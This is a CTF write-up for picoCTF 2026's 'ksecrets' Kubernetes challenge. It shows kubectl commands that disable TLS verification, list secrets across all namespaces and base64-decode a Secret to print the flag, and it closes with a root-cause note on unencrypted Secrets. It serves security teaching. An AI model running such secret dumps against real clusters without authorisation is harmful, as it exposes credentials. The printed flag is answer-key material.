# ksecrets — picoCTF 2026

**Category:** General Skills (Cloud / Kubernetes)
**Flag:** `picoCTF{ks3cr375_41n7_s4f3_e0eeefa6}`

---

## Overview

A Kubernetes cluster is exposed externally. A kubeconfig file is provided. The flag is stored in a Kubernetes `Secret` object.

---

## Enumeration

### Fix the kubeconfig

The provided kubeconfig had `127.0.0.1:6443` as the server — replaced with the actual challenge host:

```bash
sed 's|https://127.0.0.1:6443|https://green-hill.picoctf.net:49446|g' kubeconfig > kube_fixed.yaml
export KUBECONFIG=./kube_fixed.yaml
```

### TLS Certificate Mismatch

Connecting immediately throws:

```
x509: certificate is valid for challenge, kubernetes, kubernetes.default,
kubernetes.default.svc, kubernetes.default.svc.cluster.local, localhost,
not green-hill.picoctf.net
```

The cluster cert SANs don't include the external hostname. Bypassed with:

```bash
kubectl config set-cluster default --insecure-skip-tls-verify=true
```

---

## Exploitation

### List secrets

```bash
kubectl get secrets --all-namespaces --insecure-skip-tls-verify
```

```
NAMESPACE   NAME         TYPE     DATA   AGE
picoctf     ctf-secret   Opaque   1      3m
```

### Extract and decode

```bash
kubectl get secret ctf-secret -n picoctf --insecure-skip-tls-verify \
  -o json | jq -r '.data.flag' | base64 -d
```

```
picoCTF{ks3cr375_41n7_s4f3_e0eeefa6}
```

---

## Root Cause

Kubernetes `Secret` objects are base64-encoded, not encrypted. Any principal with `get`/`list` permissions on secrets — including the provided kubeconfig user — can read them in plaintext. Sensitive data should never be stored in Kubernetes Secrets without additional encryption at rest (e.g. KMS envelope encryption) and strict RBAC.
